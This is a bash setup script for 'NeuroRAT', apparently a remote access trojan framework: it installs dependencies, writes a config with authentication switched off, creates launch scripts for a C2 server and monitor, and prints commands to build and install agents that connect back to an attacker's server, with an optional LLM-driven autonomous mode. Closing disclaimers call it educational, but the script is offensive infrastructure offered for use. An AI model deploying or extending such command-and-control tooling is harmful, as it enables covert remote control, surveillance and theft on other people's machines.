#!/bin/bash
# NeuroRAT Deployment Script
# Author: Mr. Thomas Anderson (iamtomasanderson@gmail.com)
# License: MIT
# This script sets up the NeuroRAT infrastructure

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration variables
SERVER_HOST="0.0.0.0"
SERVER_PORT=8000
WEB_PORT=5000
DEFAULT_AGENT_PORT=8765

# Print banner
echo -e "${BLUE}"
echo "███╗   ██╗███████╗██╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ████████╗"
echo "████╗  ██║██╔════╝██║   ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══██╔══╝"
echo "██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║   ██║██████╔╝███████║   ██║   "
echo "██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══██╗██╔══██║   ██║   "
echo "██║ ╚████║███████╗╚██████╔╝██║  ██║╚██████╔╝██║  ██║██║  ██║   ██║   "
echo "╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   "
echo -e "${NC}"
echo -e "${YELLOW}Deployment Script${NC}"
echo -e "${YELLOW}Author: Mr. Thomas Anderson${NC}"
echo -e "${YELLOW}License: MIT${NC}"
echo ""

# Function for error handling
handle_error() {
    echo -e "${RED}Error: $1${NC}"
    exit 1
}

# Check if Python is installed
if ! command -v python3 &> /dev/null; then
    handle_error "Python 3 is not installed. Please install Python 3.8 or higher."
fi

# Check Python version
PYTHON_VERSION=$(python3 -c 'import sys; print(f"{sys.version_info.major}.{sys.version_info.minor}")')
python3 -c 'import sys; sys.exit(0 if sys.version_info >= (3, 8) else 1)' || handle_error "Python version must be 3.8 or higher. Current version: $PYTHON_VERSION"

# Create virtual environment
echo -e "${BLUE}Creating virtual environment...${NC}"
if [ ! -d "venv" ]; then
    python3 -m venv venv || handle_error "Failed to create virtual environment."
    echo -e "${GREEN}Virtual environment created.${NC}"
else
    echo -e "${YELLOW}Virtual environment already exists.${NC}"
fi

# Activate virtual environment
echo -e "${BLUE}Activating virtual environment...${NC}"
source venv/bin/activate || handle_error "Failed to activate virtual environment."
echo -e "${GREEN}Virtual environment activated.${NC}"

# Install dependencies
echo -e "${BLUE}Installing dependencies...${NC}"
pip install -U pip || handle_error "Failed to upgrade pip."
pip install -r requirements.txt || handle_error "Failed to install dependencies."
echo -e "${GREEN}Dependencies installed.${NC}"

# Create necessary directories
echo -e "${BLUE}Creating necessary directories...${NC}"
mkdir -p logs
mkdir -p data
mkdir -p agent_modules
echo -e "${GREEN}Directories created.${NC}"

# Make scripts executable
echo -e "${BLUE}Making scripts executable...${NC}"
chmod +x *.py
chmod +x *.sh
echo -e "${GREEN}Scripts are now executable.${NC}"

# Check if server files exist
if [ ! -f "agent_protocol/examples/neurorat_server.py" ]; then
    echo -e "${YELLOW}Warning: Server file 'agent_protocol/examples/neurorat_server.py' not found.${NC}"
    echo -e "${YELLOW}You may need to initialize the agent_protocol submodule.${NC}"
fi

# Setup completed
echo -e "${GREEN}NeuroRAT setup completed successfully!${NC}"
echo ""
echo -e "${BLUE}To start the server:${NC}"
echo "  ./start_server.sh"
echo ""
echo -e "${BLUE}To build an agent:${NC}"
echo "  python build_agent.py --server <your_server_ip> --port 8000 --type zip"
echo ""
echo -e "${BLUE}For more information, see:${NC}"
echo "  - README.md - Project overview"
echo "  - USAGE.md - Detailed usage instructions"
echo ""
echo -e "${YELLOW}Remember to use responsibly and ethically.${NC}"

# Deactivate virtual environment
deactivate

# Check for required dependencies
echo -e "${BLUE}Checking dependencies...${NC}"

# Check for pip
pip_version=$(pip3 --version 2>&1 | awk '{print $2}')
if [[ -z "$pip_version" ]]; then
    echo -e "${RED}Error: pip not found. Please install pip for Python 3.${NC}"
    exit 1
fi
echo "Pip version: $pip_version"

# Check for required Python packages
echo -e "${BLUE}Checking required Python packages...${NC}"
required_packages=("cryptography" "flask" "requests" "psutil")
missing_packages=()

for package in "${required_packages[@]}"; do
    if ! pip3 show "$package" &> /dev/null; then
        missing_packages+=("$package")
    else
        echo -e "✓ $package"
    fi
done

# Install missing packages
if [[ ${#missing_packages[@]} -gt 0 ]]; then
    echo -e "${YELLOW}Installing missing packages: ${missing_packages[*]}${NC}"
    pip3 install "${missing_packages[@]}"
fi

# Create config directory
echo -e "${BLUE}Creating configuration directory...${NC}"
CONFIG_DIR="./config"
mkdir -p "$CONFIG_DIR"

# Check if agent_protocol directory exists
if [[ ! -d "agent_protocol" ]]; then
    echo -e "${RED}Error: agent_protocol directory not found.${NC}"
    echo -e "Please make sure the agent_protocol directory is in the current directory."
    exit 1
fi

# Generate configuration file
echo -e "${BLUE}Generating configuration file...${NC}"
cat > "$CONFIG_DIR/neurorat.conf" << EOL
# NeuroRAT Configuration
# Generated $(date)

[server]
host = $SERVER_HOST
port = $SERVER_PORT
web_port = $WEB_PORT

[agent]
default_port = $DEFAULT_AGENT_PORT
reconnect_interval = 60
heartbeat_interval = 30

[security]
encryption = true
authentication = false
auth_token = 

[logging]
level = INFO
file = neurorat.log
EOL

echo -e "${GREEN}Configuration file created at $CONFIG_DIR/neurorat.conf${NC}"

# Check if a server IP was provided
if [[ $# -gt 0 ]]; then
    SERVER_HOST="$1"
    echo -e "${YELLOW}Using provided server IP: $SERVER_HOST${NC}"
    
    # Update the config file
    sed -i "s/host = 0.0.0.0/host = $SERVER_HOST/" "$CONFIG_DIR/neurorat.conf"
fi

# Check for optional packages for LLM support
echo -e "${BLUE}Checking for optional LLM packages...${NC}"
if pip3 show transformers &> /dev/null && pip3 show torch &> /dev/null; then
    echo -e "${GREEN}LLM support packages found. Autonomous mode will be available.${NC}"
else
    echo -e "${YELLOW}LLM support packages not found.${NC}"
    echo -e "For autonomous mode, consider installing transformers and torch:"
    echo -e "pip3 install transformers torch"
fi

# Set up database
echo -e "${BLUE}Setting up database...${NC}"
if [[ ! -f "neurorat_monitor.db" ]]; then
    echo -e "${YELLOW}Initializing new database...${NC}"
    # The database will be created when the monitor is first run
    touch "neurorat_monitor.db"
fi

# Create launch scripts
echo -e "${BLUE}Creating launch scripts...${NC}"

# Server script
cat > "start_server.sh" << EOL
#!/bin/bash
# Start NeuroRAT C2 Server
python3 agent_protocol/examples/neurorat_server.py --host \$1 --port $SERVER_PORT --web-port $WEB_PORT \$2 \$3 \$4
EOL
chmod +x "start_server.sh"

# Monitor script
cat > "start_monitor.sh" << EOL
#!/bin/bash
# Start NeuroRAT Server Monitor
python3 server_monitor.py --server \$1 --port $SERVER_PORT --api-port $WEB_PORT \$2 \$3
EOL
chmod +x "start_monitor.sh"

echo -e "${GREEN}Launch scripts created!${NC}"

# Summary
echo
echo -e "${GREEN}NeuroRAT deployment completed!${NC}"
echo
echo -e "${YELLOW}To start the C2 server:${NC}"
echo -e "  ./start_server.sh [host]"
echo
echo -e "${YELLOW}To start the server monitor:${NC}"
echo -e "  ./start_monitor.sh [host]"
echo
echo -e "${YELLOW}To deploy an agent:${NC}"
echo -e "  python3 neurorat_launcher.py install --server [server_ip] --port $SERVER_PORT"
echo
echo -e "${YELLOW}To run an agent directly:${NC}"
echo -e "  python3 neurorat_launcher.py run --server [server_ip] --port $SERVER_PORT"
echo

echo -e "${BLUE}Thank you for using NeuroRAT!${NC}"
echo -e "${RED}REMEMBER: This tool is for educational purposes only.${NC}"
echo -e "${RED}Always obtain proper authorization before using against any system.${NC}"
echo